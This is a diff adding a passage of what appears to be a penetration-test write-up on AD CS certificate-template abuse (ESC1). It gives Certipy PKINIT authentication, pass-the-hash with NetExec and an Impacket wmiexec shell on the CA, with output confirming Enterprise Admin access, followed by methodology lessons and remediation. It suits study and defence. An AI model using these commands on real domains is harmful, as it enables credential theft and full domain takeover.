@@ -1,0 +1,50 @@
+<p>The certificate was then used for PKINIT against the forest-root domain controller:</p>
+<pre><code class="language-bash">&quot;$CERTIPY&quot; auth -pfx &#x27;administrator_corp.pfx&#x27; -username &#x27;Administrator&#x27; -domain &#x27;corp.example&#x27; -dc-ip 192.0.2.20</code></pre>
+<p>The sanitised output demonstrated that the KDC accepted the certificate as the forest-root Administrator and issued a TGT:</p>
+<pre><code class="language-text">[*] Certificate identities:
+[*]     SAN UPN: &#x27;administrator@corp.example&#x27;
+[*]     SAN URL SID: &#x27;S-1-5-21-1111111111-2222222222-3333333333-500&#x27;
+[*] Using principal: &#x27;administrator@corp.example&#x27;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Wrote credential cache to &#x27;administrator.ccache&#x27;
+[*] Trying to retrieve NT hash for &#x27;administrator&#x27;
+[*] Got hash for &#x27;administrator@corp.example&#x27;: &lt;REDACTED&gt;</code></pre>
+<p>The credential cache and NT hash were treated as sensitive assessment artefacts. They were not copied into notes, screenshots or the report without redaction.</p>
+<h2>Administrative Access Validation</h2>
+<p>The recovered credential was validated against the forest-root DC and the CA. The purpose was to confirm the level of access obtained, not to perform further domain-wide actions.</p>
+<pre><code class="language-bash">read -rs &#x27;ADMIN_HASH?Administrator NT hash: &#x27;; echo; nxc smb 192.0.2.20 -d corp.example -u Administrator -H &quot;$ADMIN_HASH&quot;
+nxc smb 192.0.2.30 -d corp.example -u Administrator -H &quot;$ADMIN_HASH&quot;</code></pre>
+<p>Both systems returned successful administrative authentication:</p>
+<pre><code class="language-text">SMB  192.0.2.20  445  ROOT-DC01  [+] corp.example\Administrator:&lt;REDACTED&gt; (Pwn3d!)
+SMB  192.0.2.30  445  CA01       [+] corp.example\Administrator:&lt;REDACTED&gt; (Pwn3d!)</code></pre>
+<p>A remote shell was opened on the CA to establish that the access was operational. The hash variable initially contained an <code>LMHASH:NTHASH</code> pair, so adding another leading colon caused Impacket to return <code>too many values to unpack</code>. Extracting the value after the final colon produced the expected 32-character NT hash.</p>
+<pre><code class="language-bash">NT_HASH=&quot;${ADMIN_HASH##*:}&quot;; impacket-wmiexec -hashes &quot;aad3b435b51404eeaad3b435b51404ee:$NT_HASH&quot; &#x27;corp.example/Administrator@192.0.2.30&#x27;</code></pre>
+<p>The session confirmed the privileged identity, the target hostname and the relevant group memberships:</p>
+<pre><code class="language-text">C:\&gt;whoami
+corp\administrator
+C:\&gt;hostname
+CA01
+C:\&gt;whoami /groups
+BUILTIN\Administrators
+CORP\Domain Admins
+CORP\Schema Admins
+CORP\Enterprise Admins
+Mandatory Label\High Mandatory Level</code></pre>
+<p>No destructive actions, persistence mechanisms or additional credential extraction were required. The certificate issuance, successful PKINIT, administrative authentication and controlled command execution were sufficient to demonstrate forest-wide administrative compromise.</p>
+<h2>CertiGhost Validation Outcome</h2>
+<p>The CA build remained a valid patch-management concern and the request reached behaviour consistent with the callback-dependent processing path. Full CertiGhost exploitation was not demonstrated because the CA could not reach the rogue services from the available network position.</p>
+<p>That distinction should be preserved in reporting. A version-based check can support a patching observation, and a failed callback can document the environmental constraint, but neither should be presented as a completed CertiGhost compromise. The demonstrated compromise arose from ESC1 and should be recorded as a separate certificate template misconfiguration.</p>
+<p>The exercise also showed why simply swapping templates in a PoC is not a sound approach. A template that is vulnerable to ESC1 is not automatically suitable for CertiGhost. Each path relies on different template flags, permissions and network behaviour.</p>
+<h2>ESC8 Exposure</h2>
+<p>The CA also exposed HTTP Web Enrolment, which created an ESC8 condition. In a conventional ESC8 attack, a victim authenticates to an attacker-controlled relay service and the attacker relays that authentication to the CA's HTTP enrolment endpoint.</p>
+<p>From this assessment position, the same broad network limitation remained relevant: the victim needed to initiate authentication to the relay listener. The office and client-VPN path did not permit the required inbound connection. An internal relay point could have changed that result, but one was not required once the direct ESC1 path had been demonstrated.</p>
+<p>ESC8, ESC1 and CertiGhost should not be merged into a single issue merely because they involve the same CA. They have different root causes, prerequisites and remediation requirements.</p>
+<h2>Assessment Methodology Considerations</h2>
+<p>The first lesson was to understand the forest before relying on automated discovery. In a multi-domain forest, the authentication domain, default naming context, Configuration partition, CA host domain and template security principals may all differ.</p>
+<p>The second lesson was to separate discovery from validation. An OS build check indicated that CertiGhost might apply, but template behaviour, enrolment permissions and callback reachability still had to be established.</p>
+<p>The third lesson was to evaluate effective template rights from the current principal's position. A template may contain all the technical flags required by an attack but remain unusable because its enrolment ACL references a group from another domain.</p>
+<p>The fourth lesson was to treat network direction as part of the exploit prerequisites. Successful outbound access from a VPN client did not imply that internal servers could initiate connections back to the client.</p>
+<p>Certificate template enumeration remained necessary after the PoC failed. The CVE prompted review of the Certificate Authority, while a separate configuration issue provided the successful route to administrative access. The result depended on the forest structure, template permissions and network behaviour rather than successful exploitation of the original CVE.</p>
+<h2>Remediation</h2>
+<p>The affected authentication-capable template should be disabled or unpublished until its intended use and permissions have been reviewed. Broad principals such as <code>Authenticated Users</code> should be removed from enrolment and auto-enrolment permissions, with access restricted to the specific systems or service owners that require the template.</p>
